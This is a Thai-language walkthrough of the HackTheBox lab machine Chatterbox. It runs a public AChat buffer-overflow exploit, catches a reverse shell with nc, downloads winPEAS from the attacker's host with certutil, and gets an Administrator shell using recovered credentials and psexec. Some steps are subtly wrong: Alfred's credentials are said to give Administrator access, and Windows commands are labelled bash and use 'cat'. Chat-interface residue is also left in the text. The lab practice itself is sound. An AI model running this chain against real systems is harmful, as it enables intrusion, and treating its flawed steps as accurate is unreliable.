💻 HackTheBox: Chatterbox — "กูไม่ต้องการเธอแล้ว กูได้ root แล้ว"
เครื่อง Chatterbox เป็นเครื่อง Windows 7 ที่มีช่องโหว่ที่น่าสนใจ ซึ่งสามารถใช้เพื่อเจาะระบบและได้สิทธิ์ root ได้

🧠 ขั้นตอนการโจมตี
สแกนพอร์ตของเครื่องเป้าหมาย

ใช้คำสั่ง nmap เพื่อค้นหาพอร์ตที่เปิดอยู่:

bash Copy Edit 

```sh
nmap -sC -sV -T4 10.10.10.74 -p 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157
```

จากผลลัพธ์ พบว่า:

พอร์ต 9255 เปิดให้บริการ AChat chat system

พอร์ต 9256 เปิดให้บริการ AChat chat system

ค้นหาช่องโหว่ใน AChat

ค้นหาช่องโหว่ใน AChat โดยใช้คำสั่ง searchsploit:

bash Copy Edit

```sh
searchsploit AChat
```

พบว่า:

ช่องโหว่: AChat 0.9.6 - 'AChat' Buffer Overflow (Metasploit)

ช่องโหว่: AChat 0.9.6 - 'AChat' Buffer Overflow (Python)

ใช้ช่องโหว่เพื่อเจาะระบบ

ใช้สคริปต์ Python ที่มีอยู่ใน Exploit-DB เพื่อโจมตี:

bash Copy Edit

```sh
python 36025.py
```

จากนั้นเปิด listener ด้วย nc:

bash Copy Edit

```sh
nc -nlvp 4444
```

เมื่อเชื่อมต่อสำเร็จ จะได้ shell ที่มีสิทธิ์ของผู้ใช้ Alfred

ยกระดับสิทธิ์

ใช้เครื่องมือ winPEASx86.exe เพื่อค้นหาช่องโหว่ในการยกระดับสิทธิ์:

ดาวน์โหลด winPEASx86.exe จาก Kali:

bash Copy Edit

```sh
python -m SimpleHTTPServer 9005
```

ดาวน์โหลดไฟล์ไปยังเครื่องเป้าหมาย:

bash Copy Edit

```sh
certutil -urlcache -split -f http://<kali-ip-on-vpn>:9005/winPEASx86.exe winPEASx86.exe
```

รัน winPEASx86.exe:

bash Copy Edit

```sh
winPEASx86.exe
```

จากผลลัพธ์ พบว่า:

AutoLogon credentials: Alfred:Welcome1!

SMB service: เปิดใช้งานภายในเครื่อง

ใช้ SMB เพื่อยกระดับสิทธิ์

ใช้ psexec.py จาก Impacket เพื่อยกระดับสิทธิ์:

bash Copy Edit

```sh
python psexec.py 'Alfred:Welcome1!'@10.10.10.74
```

เมื่อเชื่อมต่อสำเร็จ จะได้ shell ที่มีสิทธิ์ของผู้ใช้ Administrator

รับ root flag

เข้าถึงไฟล์ root.txt:

bash Copy Edit

```sh
cat C:\Users\Administrator\Desktop\root.txt
```

รับ root flag และโพสต์ว่า: “กูไม่ต้องการเธอแล้ว กูได้ root แล้ว”
